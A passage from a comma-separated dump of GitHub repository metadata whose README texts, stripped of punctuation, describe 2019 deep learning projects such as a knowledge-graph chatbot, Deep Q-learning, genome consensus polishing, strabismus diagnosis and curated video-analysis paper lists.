AAAI Press 4623 4629 Ethics Why Deep Learning and Related Societal Issues Deep Learning has a strong ability to extract features from text and therefore it s good at summarizing an input text and generate corresponding responses Agent service is an industry with human labor intensely required and usually it s inefficient for communications From our previous experience sometimes we even needed to wait for hours until an agent became available to talk with Therefore our work can be used as a chit chat system and conversation system which could be useful in automatic agent service to improve communication efficiency and decrease human resources required Potential Consequences of malicious Use Since our algorithm focuses on the generation of informative responses there might be some potential consequences of misuse It might facilitate online frauding since fewer human resources are required with our approach To illustrate malicious people may develop chatbots to implement large scale online fraud activities based on our research results Division of Labor Jiayang Wu Data preprocessing and entity linking Ke Ding Constructing GNN to encode knowledge graph Houyu Zhang Designing encoder and decoder by using Transformer Haili Chen Designing attention mechanisms,2019-11-08T23:05:33Z,2019-12-14T21:34:32Z,Python,JiayangWu,User,1,2,0,27,master,JiayangWu#Harrryyy#Craigie1996#dingke123,4,0,0,0,0,0,3
miloharper,deep-q-learning,n/a,Deep Q Learning A demonstration of how Deep Q Learning can solve the NChain v0 game https gym openai com envs NChain v0 The NChain game has 5 possible states 0 1 2 3 4 The agent can play Action 0 and take 1 step forward for which it receives a reward of 0 or it can play Action 1 and go back to position 0 and receive an instant reward of 2 However if it makes it all the way to state 4 it can receive a reward of 10 To make it more challenging 20 of the time the agent slips and the intended action is reversed A low intelligence agent which exhibits short term thinking will learn to play Action 1 repeatedly to get the reward of 2 However a truly intelligent agent will accept delayed gratification and will learn to keep moving forward to claim the reward of 10 even though there is no short term benefit for doing so To solve the game we create a neural network with 5 input neurons 10 neurons in the hidden layer and 2 output neurons The 5 input neurons take a one hot vector representing the state The 2 output neurons represent the expected reward for the 2 actions,2019-11-26T14:58:35Z,2019-11-27T14:47:25Z,Python,miloharper,User,1,2,0,3,master,miloharper,1,0,0,0,0,0,0
GokulKarthik,deep-learning-projects-pytorch,n/a,Deep Learning Projects using PyTorch This space is to tune my practical deep learning skills I will develop various deep learning projects using PyTorch without any Ctrl C and Ctrl V and will upload the notebooks here 1 Image Fashion MNIST Dataset Multi Class Image Classification using modified LeNet Link https github com GokulKarthik deep learning blob master fashion mnist ipynb 2 Text Language Words Dataset Multi Class Word Classification using character level LSTM Link https github com GokulKarthik deep learning blob master 2 multi class word classification ipynb 3 Text US Baby Names Dataset Name Generation using character level LSTM Link https github com GokulKarthik deep learning blob master 3 baby name generation ipynb 4 Image Neural Style Transfer using pre trained VGG19 Net Link https github com GokulKarthik deep learning blob master 4 neural style transfer ipynb Code References 1 https pytorch org tutorials index html 2 https blog floydhub com a beginners guide on recurrent neural networks with pytorch 3 https nextjournal com gkoehler pytorch neural style transfer,2019-12-10T05:27:49Z,2019-12-13T08:15:48Z,Jupyter Notebook,GokulKarthik,User,1,2,0,37,master,GokulKarthik,1,0,0,0,0,0,0
colegno,Calculatrice.java.py.js.npm.git.njk.c.cpp.,deep#ia#npm,Calculatrice java py js npm git njk c cpp git This is a deep learning project Installation To install npm install,2019-11-09T20:07:41Z,2019-11-11T14:20:17Z,n/a,colegno,User,3,2,0,2,master,colegno,1,0,0,1,0,1,0
brandontrabucco,playground,n/a,Playground Playground is a framework for training deep policies Have fun Brandon Features We currently implement the following algorithms SAC TD3 DDPG Policy Gradient PPO Installation Install Playground by cloning the repo and using pip git clone http github com brandontrabucco playground pip install e playground Dependencies We require a few packages for training Mujoco 2 0 TensorFlow 2 0,2019-11-16T07:39:19Z,2019-12-07T11:50:20Z,Python,brandontrabucco,User,1,2,0,4,master,brandontrabucco,1,0,0,0,0,0,0
tinyfrog,tinyfrog-sikurity-1,n/a,tinyfrog sikurity 1 deep learning from scratch1,2019-12-07T09:53:20Z,2019-12-15T03:12:37Z,Python,tinyfrog,User,2,2,1,25,master,tinyfrog,1,0,0,0,0,0,0
07hyx06,Pytorch-Light-Repo-Of-Deep-Learning-Models,n/a,Pytorch Light Repo Of Deep Learning Models mdgtx1060 python3 7 and torch 1 1 0 VGG ResNet DenseNet ShuffleNet SSD Yolo v2 RetinaNet Faster RCNN Cycle GAN pix2pix UGATITA RTX2080ti CAM CPU,2019-11-25T12:27:45Z,2019-12-02T03:31:22Z,Python,07hyx06,User,2,2,0,41,master,07hyx06,1,0,0,0,0,0,0
sohelnadaf,Emotion-recognition-Zulfikar_comp-,n/a,Emotion recognition Zulfikarcomp Emotion recognition using deep learning trained dataset https drive google com open id 1rcxlOCCwC 5DMigiBdfy0Wki OJEe6G,2019-12-08T13:31:44Z,2019-12-08T17:27:25Z,Jupyter Notebook,sohelnadaf,User,2,2,0,5,master,sohelnadaf,1,0,0,0,0,0,0
manjunath5496,5-Important-Deep-Learning-Research-Papers,n/a,Human level control through deep reinforcement learning DeepFashion2 A Versatile Benchmark for Detection Pose Estimation Segmentation and Re Identification of Clothing Images Semi Supervised Learning with Ladder Network Fast Graph Representation Learning With Pytorch Geometric High Fidelity Image GenerationWith Fewer Labels,2019-12-05T16:20:50Z,2019-12-05T16:37:11Z,n/a,manjunath5496,User,1,2,0,3,master,manjunath5496,1,0,0,0,0,0,0
anmspro,Intro-to-Tensorflow-for-Deep-Learning-Udacity,n/a,Google Colaboratory Algorithms implemented in Google Colab,2019-11-17T21:03:58Z,2019-12-10T16:48:14Z,Jupyter Notebook,anmspro,User,1,2,0,14,master,anmspro,1,0,0,0,0,0,0
lbcb-sci,roko,n/a,Roko A deep learning based tool for consensus polishing Description Roko is a consensus polisher which takes draft assembly and aligned reads in BAM format and outputs a set of contigs in FASTA format It uses deep learning architecture to produce high quality consensus Features are represented as sampled reads in a window and labels are mapped to draft assembly in Medaka https github com nanoporetech medaka style fashion Dependencies Check HTSlib dependencies https github com samtools htslib blob develop INSTALL gcc 5 0 and g python 3 6 or 3 7 python3 dev and venv Installation GPU bash git clone https github com lbcb sci roko git roko cd roko make gpu CPU bash git clone https github com lbcb sci roko git roko cd roko make cpu Usage To activate virtual environment PROJECTDIR roko bin activate To generate features for model training or inference python features py options Draft sequence in FASTA format Reads aligned to in BAM format Output name e g output hdf5 options Y Truth genome aligned to in BAM format training only t default 1 Number of worker processes To generate BAM files for feature generation pomoxis https github com nanoporetech pomoxis minialign method is recommended To train a model python train py options Directory containing generated hdf5 files used for training or one hdf5 file Directory for saving trained model options val Directory containing generated hdf5 files used for validation or one hdf5 file b default 128 Batch size used for train and validation memory default False If flag is present traning and validation data is stored in RAM t default 0 Number of workers for train and validation data loaders t for train data loader and t for validation To make inference python inference py options Path to the generated features in hdf5 Path to the saved model in pth format Path to the output file FASTA format options t default 0 Number of workers for inference b default 128 Inference batch size Comparison The model was trained and tested on FASTQ Basecalls from Zymo R10 Native 3 Peaks https lomanlab github io mockcommunity r10 html Data was binned using Loman s script https github com LomanLab mockcommunity blob master analysis scripts binreads py Draft assemblies were generated using raven https github com lbcb sci raven BAM files used for feature generation and BAM files used for labeling were generated by minialign script from pomoxis https github com nanoporetech pomoxis tool Organisms used for training are B subtilis E faecalis E coli L Monocytogenes and S enterica P aeruginosa was used for validation Models are tested on S aureus Results were evaluated using pomoxis https github com nanoporetech pomoxis assessassembly script The mean results are given in the following table Model Total error Mismatch Deletion Insertion Qscore Raven 0 160 0 040 0 059 0 061 27 97 Medaka 0 037 0 012 0 007 0 017 34 30 HELEN 0 066 0 019 0 031 0 016 31 78 Roko 0 035 0 013 0 008 0 013 34 55 Total error does not correspond to the sum of errors because of rounding Download The model stated in comparison section R10 Guppy 2 3 8 can be downloaded here https www dropbox com s ya7ovk9g7mop9lb r102 3 8 pth dl 0 Contact information This tool is still in an early development stage All bugs and questions can be reported to dominik stanojevic fer hr dominik stanojevic fer hr mile sikic fer hr mile sikic fer hr or milesikic gis a star edu sg milesikic gis a star edu sg,2019-12-06T16:46:46Z,2019-12-07T18:29:42Z,Python,lbcb-sci,Organization,3,2,0,1,master,dominikstanojevic,1,0,0,0,0,0,0
cympfh,dlsh,n/a,dlsh Deep Learning on Shell See examples Example console echo 3 2 echo 0 0 echo 0 1 echo 1 1 3 2 0 0 0 1 1 1 This data means a matrix with shape 3 2 or 3 instances with 2 dimentions echo 3 2 echo 0 0 echo 0 1 echo 1 1 linear w data fc1 3 5 5 5869226 2 384049 3 234392 0 4512289 5 5657387 1 0818138 1 1542585 3 5078242 1 8856971 1 1181798 1 7649012 3 585418 11 034574 3 6150548 1 7477741 echo 3 2 echo 0 0 echo 0 1 echo 1 1 linear w data fc1 sigmoid 3 5 0 0037325555 0 91560286 0 03789181 0 61093134 0 0038121643 0 25316292 0 2397121 0 97090954 0 86826414 0 24634908 0 8538224 0 9730228 0 9999839 0 97379005 0 8516718 echo 3 2 echo 0 0 echo 0 1 echo 1 1 linear w data fc1 sigmoid linear w data fc2 3 1 3 6515105 4 22001 3 8068254 echo 3 2 echo 0 0 echo 0 1 echo 1 1 linear w data fc1 sigmoid linear w data fc2 sigmoid 3 1 0 025295435 0 9855144 0 021735666,2019-12-05T09:14:31Z,2019-12-13T12:58:20Z,Rust,cympfh,User,1,2,0,13,master,cympfh,1,0,0,0,0,0,0
yuluyan,cs394n-Secure-Deep-Learning,n/a,cs394n Secure Deep Learning Course project for cs394n about secure deep learning,2019-11-25T04:23:47Z,2019-11-25T04:41:43Z,n/a,yuluyan,User,2,2,0,1,master,yuluyan,1,0,0,0,0,0,0
dantatartes,tensorboi,n/a,tensorboi Deep learning library from scratch Repository structure tensorboi layers py Module Sequential Linear activations py ReLU LeakyReLU Sigmoid SoftMax criterions py MSE CrossEntropy regularizers py Dropout BatchNorm optimizers py SGD,2019-11-05T10:34:38Z,2019-11-10T18:53:43Z,Python,dantatartes,User,2,2,1,5,master,dantatartes,1,0,0,0,0,0,0
facebookresearch,deep-variance-reduction,n/a,Deep Variance Reduction Source code from the experiments in On the Ineffectiveness of Variance Reduced Optimization for Deep Learning https arxiv org abs 1812 04529 This code should be considered archival Pull requests will only be accepted for bug fixes Running The reproduce scripts in reproduce should run in your cluster environment Each script takes a one or several integer arguments which must be swept over to produce the full set of data for use by the plotting scripts Contributing See the CONTRIBUTING CONTRIBUTING md file for how to help out License CC BY NC 4 0 licensed as found in the LICENSE file,2019-11-06T16:41:44Z,2019-11-26T05:06:26Z,Python,facebookresearch,Organization,4,2,2,1,master,adefazio,1,0,0,0,0,0,0
gusdnd852,Strabismus-Recognition,n/a,Strabismus Recognizer This project is to develop strabismus diagnostic software for use in ophthalmology 1 Project Overeview img https www aao org image axd id f0a526af 52f3 4edb a4a5 a5d9ba8386a7 t 636486437122700000 Strabismus is a condition in which the eyes do not properly align with each other when looking at an object The eye which is focused on an object can alternate The condition may be present occasionally or constantly If present during a large part of childhood it may result in amblyopia or loss of depth perception If onset is during adulthood it is more likely to result in double vision img http morancore utah edu wp content uploads 2017 08 huassessment003 jpg Strabismus is expressed in various types and according to eye movement it is classified into esotropia exotropia hypertropia and hypotropia Currently in ophthalmology ophthalmologists diagnose the strabismus with the naked eye but it is very difficult to diagnose strabismus unless a strabismus specialist However not all hospitals have strabismus specialists so many ophthalmologists are currently struggling with strabismus diagnosis img https lilianweng github io lil log assets images transformer png So our goal is to develop software that automatically diagnoses strabismus We are receiving data from some ophthalmologists and are thinking about using deep learning to solve this problem We will experiment with various models such as MLP RNN GRU LSTM CNN LSTM CNN Transformer and so on and if all models do not perform well we will construct a new model 2 Development environment OS Windows 10 IDE IntelliJ 2019 01 Language Python 3 6 PC Specifications CPU Intel R Core TM i7 9700KF 3 60Ghz RAM Samsung 16GB GPU Nvidia RTX 2070 3 Experiments image https user images githubusercontent com 38183241 70560563 2d915900 1bcc 11ea 8dfd b1f908dfdd67 png Random cross validation was conducted for the experiment Firstly we ramdomly select 83 patients data 85 from a total of 95 patients and proceed model training After that 15 patients data 15 that have not been trained are selected for diagnosis In each experiment we create and experiment with a total of 100 new models and evaluate the minimum and average accuracy of the 100 models as the performance of the model 3 1 Traditional Machine Learning Models Experiements Model Minimum Acc Average Acc SVM 0 2352 0 5585 NuSVM 0 5882 0 7664 LinearSVM 0 4705 0 7140 Decision Tree 0 4705 0 8118 Extra Tree 0 4705 0 7775 Ada Boost 0 5294 0 7856 Random Forest 0 4117 0 8293 Gradient Boosting 0 6470 0 8520 Gaussian Naive Bayes 0 1176 0 4752 Bernoulli Naive Bayes 0 3529 0 5882 K Nearest Neighbors 0 4117 0 7076 MLP iter 2000 0 4705 0 7968 3 2 1D Convolutional Neural Networks Experiements Model Size Params Iteration Minimum Acc Average Acc Concatenate ConvNet 6Layers 0 92MB 146 465 2000 0 6470 0 8444 Concatenate ConvNet 8Layers 9 64MB 2 316 833 2000 0 7058 0 8817 Network In Network 13Layers 2 04MB 322 465 2000 0 5294 0 8788 Network In Network 19Layers 21 35MB 5 120 417 2000 0 5882 0 8270 Group ConvNet 8Layers 2Groups 5 25MB 1 164 513 2000 0 8823 0 9883 Group ConvNet 8Layers 4Groups 3 05MB 588 353 2000 0 8823 0 9935 4 Licence Copyright 2019 CBNU CS Dept AI Robot LAB Licensed under the Apache License Version 2 0 the License you may not use this file except in compliance with the License You may obtain a copy of the License at http www apache org licenses LICENSE 2 0 Unless required by applicable law or agreed to in writing software distributed under the License is distributed on an AS IS BASIS WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND either express or implied See the License for the specific language governing permissions and limitations under the License,2019-12-10T03:40:56Z,2019-12-13T16:00:25Z,Python,gusdnd852,User,1,2,0,13,master,gusdnd852,1,0,0,0,0,0,0
Mayy1994,RL_segmentation,n/a,RLsegmentation This is the code for Medical Image Segmentation with Deep Reinforcement Learning The proposed model consists of two neural networks The first is FirstP Net whose goal is to find the first edge point and generate a probability map of the edge points positions The second is NextP Net which locates the next point based on the previous edge point and image information This model segments the image by finding the edge points step by step and ultimately obtaining a closed and accurate segmentation result process images Fig2 png Figure 1 The overall process of the proposed system FirstP Net finds the first edge point and generates a probability map of edge points positions NextP Net locates the next point based on the previous edge point and image information examples images Fig7 png Figure 2 The ground truth GT boundary is plotted in blue and the magenta dots are the points found by NextP Net The red pentagram represents the first edge point found by FirstP Net The first and third rows are the original results and the second and fourth rows are the smoothed results after post processing Requirements Python2 7 torch 0 4 0 torchvision 0 2 1 matplotlib 2 2 3 numpy 1 16 4 opencv python 4 1 0 25 scikit image 0 14 3 scikit learn 0 20 4 shapely 1 6 4 post2 cffi scipy Installation 1 Clone this repository git clone https github com Mayy1994 RLsegmentation git 2 As we use a crop and resize function like that in Fast R CNN https github com longcw RoIAlign pytorch to fix the size of the state it needs to be built with the right arch option for Cuda support before training https github com multimodallearning pytorch mask rcnn GPU arch TitanX sm52 GTX 960M sm50 GTX 1070 sm61 GTX 1080 Ti sm61 cd nms src cuda nvcc c o nmskernel cu o nmskernel cu x cu Xcompiler fPIC arch arch cd python build py cd cd roialign roialign src cuda nvcc c o cropandresizekernel cu o cropandresizekernel cu x cu Xcompiler fPIC arch arch cd python build py cd 3 Run train py to train the DQN agent on 15 subjects from the ACDC dataset or you can run val py to test the proposed model on this dataset Training curves and results Ablation study State Experiment 0 grayscale layer Sobel layer cropped probability map global probability map and past points map Experiment 1 grayscale layer Sobel layer and past points map layer Experiment 2 grayscale layer Sobel layer cropped probability map global probability map Reward Experiment 3 employing the difference IoU reward as the final immediate reward curves images Fig9 png Figure 3 The changes in three separate reward values total reward value F measure accuracy and APD accuracy according to the learning iterations during the training process on ACDC dataset Comparison with baseline,2019-11-20T12:23:28Z,2019-11-29T12:15:32Z,Python,Mayy1994,User,1,2,0,17,master,Mayy1994,1,0,0,0,1,0,0
alvations,tsundoku,nlp#tutorial,Tsundoku Session 1 Hello DL World https github com alvations tsundoku blob master empty Session 201 20 20Hello 20DL 20World ipynb Session 2 Deep Dive into DL https github com alvations tsundoku blob master empty Session 202 20 20Deep 20Dive 20to 20Deep 20Learning ipynb Session 3 Using Word2Vec to understand NLP Task Creation https github com alvations tsundoku blob master completed Session 203 20 20Using 20Word2Vec 20to 20understand 20NLP 20Task ipynb Session 4 Nuts and Bolts https github com alvations tsundoku blob master empty Session 204 20 20Nuts 20and 20Bolts ipynb Session 5 Ngram Language Model https github com alvations tsundoku blob master empty Session 205 20 20Ngram 20Language 20Model 20with 20NLTK ipynb Session 6 GRU Language Model https github com alvations tsundoku blob master empty Session 206 20 20GRU 20Language 20Model ipynb Session 7 The Annotated Transformer https www kaggle com alvations the annotated transformer from alexander rush Session 8 Transfer Learning for NLP https www kaggle com alvations transfer learning in nlp Session 9 Kopitiam https github com alvations kopitiam blob master Kopitiam 20 20PyTorch 20RNN 20Seq2Seq ipynb Session 10 Course Asessement Toxic Comments Classification https github com alvations tsundoku blob master empty Session 20Last 20 20Textcat Toxic Empty ipynb Note Try not to peek at the completed notebooks https github com alvations tsundoku tree master completed until end of the class License MIT License,2019-12-01T11:25:41Z,2019-12-05T22:53:03Z,Jupyter Notebook,alvations,User,1,2,1,27,master,alvations,1,0,0,0,0,0,0
bhiziroglu,Language-as-an-Abstraction-for-Hierarchical-Deep-Reinforcement-Learning,n/a,Language as an Abstraction for Hierarchical Deep Reinforcement Learning PyTorch implementation of Language as an Abstraction for Hierarchical Deep Reinforcement Learning https arxiv org pdf 1906 07343 pdf This paper uses language as the abstraction for Hierarchical Reinforcement Learning Using this approach agents can learn to solve to diverse temporally extended tasks such as object sorting and multi object rearrangement Introduction The proposed architecture has a 2 layer hierarchical policy with compositional language as the abstraction between the high level policy and the low level policy This repository aims to replicate the results for low level policy experiments Figure 4 in the paper The experiments include state observations and raw pixel observations This repository only focuses on the state based representation Figure 7 in the paper imgs hir png The environment and some instructions considered in this work imgs low level rollout gif Low level policy trying to complete randomly sampled goals Installation and Running The paper uses the CLEVR Robot environment https github com google research clevrrobotenv which is built on top of the MuJoCo http www mujoco org physics simulator These libraries are required PyTorch 1 3 is used Simply running the main py file starts the training Future Instruction Relabeling Strategy Algorithm 4 in the paper and the Computation graph of the state based low level policy Figure 7 in the paper can be found in util py DQN Instruction Encoder and the f1 network can be found in networks py imgs slowgoal gif Agent completing an instruction Details hal imgs hal png The part showed by the red box is implemented in this repository The instructions are sampled randomly from the environment References Yiding Jiang Shixiang Gu Kevin Murphy and Chelsea Finn Language as an Abstraction for Hierarchical Deep Reinforcement Learning In Workshop on Structure Priors in Reinforcement Learningat ICLR 2019 jun 2019 URL http arxiv org abs 1906 07343,2019-12-05T00:19:18Z,2019-12-11T19:25:38Z,Python,bhiziroglu,User,1,2,0,5,master,bhiziroglu,1,0,0,0,0,0,0
jiajunhua,HuaizhengZhang-Awsome-Deep-Learning-for-Video-Analysis,n/a,Maintenance https img shields io badge Maintained 3F YES green svg https GitHub com Naereen StrapDown js graphs commit activity Awesome https awesome re badge svg https awesome re GitHub https img shields io badge License MIT lightgrey svg Awesome Deep Learning for Video Analysis This repo contains some video analysis especiall multimodal learning for video analysis research I summarize some papers and categorize them by myself You are kindly invited to pull requests I pay more attention on multimodal learning related work and some research like action recognition is not the main scope of this repo Contents Video Tutorial tutorial Dataset dataset Tool tool Video Classification video classification spatiotemporal features Multimodal for Video Analysis multimodal for video analysis Video Moment Localization video moment localization Video Retrieval video retrieval Video Advertisement video advertisement also include some image advertisement paper Visual Commonsense Reasoning visual commonsense reasoning Video Highlight video highlight prediction Object Tracking object tracking Audio Visual Dialog audio visual dialog Action Recognition action recognition spatiotemporal features video classification Tutorial CVPR2019 Multi Modal Learning from Videos Project Page https sites google com view mmlv home awesome multimodal ml Reading list for research topics in multimodal machine learning GitHub https github com pliang279 awesome multimodal ml Dataset I find a very interesting website Sortable and searchable compilation of video dataset Video Dataset Overview https www di ens fr miech datasetviz AVA dataset AVA is a project that provides audiovisual annotations of video for improving our understanding of human activity Project https research google com ava index html PyVideoResearch A repositsory of common methods datasets and tasks for video research GitHub https github com gsig PyVideoResearch How2 Dataset How2 A Large scale Dataset for Multimodal Language Understanding Paper https arxiv org pdf 1811 00347 pdf GitHub https github com srvk how2 dataset Moments in Time Dataset A large scale dataset for recognizing and understanding action in videos Dataset https github com metalbubble momentsmodels Pretrained Model http moments csail mit edu Pretrained image and video models for Pytorch GitHub https github com alexandonian pretorched x Youtube 8M new segment task Blog https ai googleblog com 2019 06 announcing youtube 8m segments dataset html Tool This document describes the collection of utilities created for Detection and Classification of Acoustic Scenes and Events DCASE GitHub https dcase repo github io dcaseutil index html Easy to use video deep features extractor GitHub https github com antoine77340 videofeatureextractor Video Platform for Action Recognition and Object Detection in Pytorch GitHub https github com MichiganCOG ViP FAIR Self Supervised Learning Integrated Multi modal Environment SSLIME GitHub https github com facebookresearch fair sslime Paper Video Classification Spatiotemporal Features TSM Temporal Shift Module for Efficient Video Understanding Paper https arxiv org pdf 1811 08383 pdf GitHub https github com mit han lab temporal shift module Long Term Feature Banks for Detailed Video Understanding CVPR2019 Paper https arxiv org pdf 1812 05038 pdf GitHub https github com facebookresearch video long term feature banks Deep Learning for Video Classification and Captioning Paper https arxiv org pdf 1609 06782 pdf Large scale Video Classification with Convolutional Neural Networks Paper https static googleusercontent com media research google com zh CN pubs archive 42455 pdf Learning Spatiotemporal Features with 3D Convolutional Networks Paper http www cv foundation org openaccess contenticcv2015 papers TranLearningSpatiotemporalFeaturesICCV2015paper pdf Two Stream Convolutional Networks for Action Recognition in Videos Paper https papers nips cc paper 5353 two stream convolutional networks for action recognition in videos pdf Action Recognition with Trajectory Pooled Deep Convolutional Descriptors Paper http www cv foundation org openaccess contentcvpr2015 papers WangActionRecognitionWith2015CVPRpaper pdf Non local neural networks Paper http openaccess thecvf com contentcvpr2018 papers WangNon LocalNeuralNetworksCVPR2018paper pdf GitHub https github com facebookresearch video nonlocal net Wang Xiaolong Ross Girshick Abhinav Gupta and Kaiming He CVPR 2018 Summary Learning Correspondence from the Cycle consistency of Time Paper https arxiv org pdf 1903 07593 pdf GitHub https github com xiaolonw TimeCycle Xiaolong Wang and Allan Jabri and Alexei A Efros CVPR2019 Summary 3D ConvNets in Pytorch GitHub https github com Tushar N pytorch resnet3d Multimodal For video Analysis Awsome list for multimodal learning GitHub https github com pliang279 multimodal ml reading list VideoBERT A Joint Model for Video and Language Representation Learning Paper https arxiv org abs 1904 01766 AENet Learning Deep Audio Features for Video Analysis Paper https arxiv org pdf 1701 00599 pdf GitHub https github com znaoya aenet Look Listen and Learn Paper https arxiv org pdf 1705 08168 pdf Objects that Sound Paper https arxiv org pdf 1712 06651 Learning to Separate Object Sounds by Watching Unlabeled Video Paper https arxiv org pdf 1804 01665 pdf Gao Ruohan Rogerio Feris and Kristen Grauman arXiv preprint arXiv 1804 01665 2018 Ambient Sound Provides Supervision for Visual Learning Paper http www eccv2016 org files posters O 1B 01 pdf Owens Andrew Jiajun Wu Josh H McDermott William T Freeman and Antonio Torralba ECCV 2016 Summary unsupervised learning Learning Cross Modal Temporal Representations from Unlabeled Videos Google Blog https ai googleblog com 2019 09 learning cross modal temporal html m 1 Video Moment Localization Localizing Moments in Video with Natural Language Paper https arxiv org pdf 1708 01641 pdf GitHub https github com LisaAnne LocalizingMoments Video Retrieval Use What You Have Video retrieval using representations from collaborative experts GitHub https github com albanie collaborative experts HowTo100M Learning a Text Video Embedding by Watching Hundred Million Narrated Video Clips Project Website https www di ens fr willow research howto100m Miech Antoine et al arXiv 1906 03327 2019 Learning a Text Video Embedding from Incomplete and Heterogeneous Data Paper https arxiv org pdf 1804 02516 pdf GitHub https github com antoine77340 Mixture of Embedding Experts Miech Antoine Ivan Laptev and Josef Sivic ECCV 2018 Summary combine multi modality information calculate similarities and weight different similarities Cross Modal and Hierarchical Modeling of Video and Text Paper https arxiv org pdf 1810 07212 pdf B Zhang H Hu F Sha ECCV 2018 Summary learning the intrinsic hierarchical structures of both videos and texts Make video and text closer make videos closer and make text closer A dataset for movie description Paper https arxiv org pdf 1501 02530 pdf Rohrbach Anna Marcus Rohrbach Niket Tandon and Bernt Schiele CVPR 2015 Summary dataset paper Web scale Multimedia Search for Internet Video Content Thesis http www lujiang info resources Thesis pdf Lu Jiang Summary amazing thesis Video Advertisement Also include some image advertisement paper Automatic understanding of image and video advertisements Paper http openaccess thecvf com contentcvpr2017 papers HussainAutomaticUnderstandingofCVPR2017paper pdf Project http people cs pitt edu kovashka ads Hussain Zaeem Mingda Zhang Xiaozhong Zhang Keren Ye Christopher Thomas Zuha Agha Nathan Ong and Adriana Kovashka CVPR 2017 Summary Image and video advertisement datasets and baselines Multimodal Representation of Advertisements Using Segment level Autoencoders Paper https sail usc edu publications files p418 somandepalli pdf GitHub https github com usc sail mica multimodal ads Somandepalli Krishna Victor Martinez Naveen Kumar and Shrikanth Narayanan ICMI 2018 Summary video and audio features to understand whether video is funny or not Story Understanding in Video Advertisements Paper http people cs pitt edu kovashka yebuettnerkovashkabmvc2018 pdf GitHub https github com yekeren Story Videoadsunderstanding Keren Ye Kyle Buettner Adriana Kovashka BMVC 2018 Summary Combine multiple features including climax audio and so on to analyze video ads ADVISE Symbolism and External Knowledge for Decoding Advertisements Paper http people cs pitt edu kovashka yekovashkaadviseeccv2018 pdf GitHub https github com yekeren ADVISE Keren Ye and Adriana Kovashka ECCV2018 Summary action reason statement for advertisement Many pre trained models are as prior knowledge SSD DenseCAP and GloVe Visual Commonsense Reasoning From Recognition to Cognition Visual Commonsense Reasoning Paper https arxiv org pdf 1811 10830 pdf Project Website https visualcommonsense com Rowan Zellers Yonatan Bisk Ali Farhadi Yejin Choi CVPR2019 Summary First dataset paper Use BERT and fastrcnn as the baseline Video Highlight Prediction Video highlight prediction using audience chat reactions Fu Cheng Yang Joon Lee Mohit Bansal and Alexander C Berg EMNLP 2017 Object Tracking SenseTime s research platform for single object tracking research implementing algorithms like SiamRPN and SiamMask GitHub https github com STVIR pysot Audio Visual Dialog Audio Visual Scene Aware Dialog GitHub https github com batra mlp lab avsd Alamri Huda Vincent Cartillier Abhishek Das Jue Wang Stefan Lee Peter Anderson Irfan Essa et al arXiv preprint arXiv 1901 09107 2019,2019-11-16T02:54:41Z,2019-11-25T09:05:32Z,n/a,jiajunhua,User,1,2,0,76,master,HuaizhengZhang,1,0,0,0,0,0,0
vishavdhanjal,FDP-program-on-Deep-Learning-and-its-applications,n/a,,2019-12-09T13:56:32Z,2019-12-14T15:46:05Z,Jupyter Notebook,vishavdhanjal,User,1,2,0,14,master,vishavdhanjal,1,0,0,0,0,0,0
nikhil3456,Deep-Reinforcement-Learning-in-Large-Discrete-Action-Spaces,n/a,Deep Reinforcement Learning in Large Discrete Action Spaces This is a PyTorch implementation of the paper https arxiv org abs 1512 07679 Deep Reinforcement Learning in Large Discrete Action Spaces Gabriel Dulac Arnold Richard Evans Hado van Hasselt Peter Sunehag Timothy Lillicrap Jonathan Hunt Timothy Mann Theophane Weber Thomas Degris Ben Coppin Installation To install the relevant libraries run the following command pip install r requirements txt Demonstration of Model Demonstration video cartpoledemo cartpoledemo gif Results for k 1 K is the number of nearest neighbours Results for k 10 K is the number of nearest neighbours rewardk1 png rewardvsstepsk1 png rewardk1 png rewardvsstepsk10 png Train the agent To train the agent simply run the main ipynb file provided in the repository The parameters can be updated by changing the values in the Arguments class Test the agent After training the agent using the above code run the following code to test it on the cartpole environment python import gym from gym import wrappers envtowrap ContinuousCartPoleEnv env wrappers Monitor envtowrap demo force True env reset for iepisode in range 1 observation env reset epreward 0 for t in range 500 env render action agent selectaction observation observation reward done info env step action epreward reward if done print Episode finished after timesteps format t 1 break print epreward envtowrap close env close Acknowledgements Our DDPG code is based on the excellent implementation provided by ghliu pytorch ddpg https github com ghliu pytorch ddpg The WOLPERTINGER agent code and actionspace py code is based on the excellent implementation of the paper provided by jimkon Deep Reinforcement Learning in Large Discrete Action Spaces https github com jimkon Deep Reinforcement Learning in Large Discrete Action Spaces Reference If you are interested in the work and want to cite it please acknowledge the following paper articleDBLP journals corr Dulac ArnoldESC15 author Gabriel Dulac Arnold and Richard Evans and Peter Sunehag and Ben Coppin title Reinforcement Learning in Large Discrete Action Spaces journal CoRR volume abs 1512 07679 year 2015 url http arxiv org abs 1512 07679 archivePrefix arXiv eprint 1512 07679 timestamp Mon 13 Aug 2018 16 46 25 0200 biburl https dblp org rec bib journals corr Dulac ArnoldESC15 bibsource dblp computer science bibliography https dblp org Collaborators 1 Shashank Srikanth https github com talsperre 2 Nikhil Bansal https github com nikhil3456,2019-11-26T06:17:03Z,2019-11-28T14:50:47Z,Jupyter Notebook,nikhil3456,User,1,2,0,7,master,nikhil3456#talsperre,2,0,0,0,0,0,0
zcemycl,ProbabilisticPerspectiveMachineLearning,n/a,Probabilistic Perspective Machine Learning ppml License MIT https img shields io badge License MIT yellow svg https opensource org licenses MIT This repository contains code to replicate modify the codes and prove the mathematical Machine Learning concepts from 1 probml pmtk3 https github com probml pmtk3 2 Machine Learning A Probabilistic Perspective https doc lagout org science Artificial 20Intelligence Machine 20learning Machine 20Learning 20A 20Probabilistic 20Perspective 20 5BMurphy 202012 08 24 5D pdf All the work is in the following format MATLAB implementation Python implementation with proofs and explanations This repository is intended for people who want to learn more about Probabilistic Machine Learning alongside with simplified examples and will cover different concepts such as Number Game Bayes https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Machine 20Learning 20A 20Probabilistic 20Perspective 3GMDD F3 2 3 2numberGame ipynb Monte Carlo Sampling Pi https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Machine 20Learning 20A 20Probabilistic 20Perspective 2Probability F2 19 2 19mcEstimatePi ipynb naive Bayes classifier https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Machine 20Learning 20A 20Probabilistic 20Perspective 3GMDD F3 8 3 8naiveBayesBowDemo ipynb student distribution em algorithm https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Machine 20Learning 20A 20Probabilistic 20Perspective 2Probability F2 8 2 8RobustDemo ipynb Principal Component Analysis https github com zcemycl ProbabilisticPerspectiveMachineLearning blob master Machine 20Learning 20A 20Probabilistic 